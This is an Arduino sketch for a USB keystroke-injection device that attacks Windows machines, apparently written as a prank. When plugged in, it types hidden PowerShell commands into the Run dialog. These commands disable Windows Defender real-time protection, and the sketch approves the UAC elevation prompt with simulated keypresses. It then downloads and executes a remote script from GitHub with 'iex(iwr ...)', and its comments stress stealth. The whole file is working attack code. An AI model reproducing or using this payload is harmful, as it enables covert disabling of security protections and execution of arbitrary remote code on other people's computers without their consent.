#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
  
  // Disable Defender
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);

  typeString("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs");
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100); 

  // // Wait for UAC prompt and press Left arrow + Enter (to select "Yes")
  delay(2500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1500);

  // Open Run dialog (Win+R) - Fast and stealthy
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  // Type powershell hidden command
  typeString("powershell -w hidden iex(iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/rickrollPrank.ps1')");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  
  Keyboard.end();
}

// Fast typing with minimal delay
void typeString(const char* str) {
  while (*str) {
    Keyboard.write(*str);
    delay(5);  // Faster typing
    str++;
  }
}

void loop() {
  // Nothing to do here
}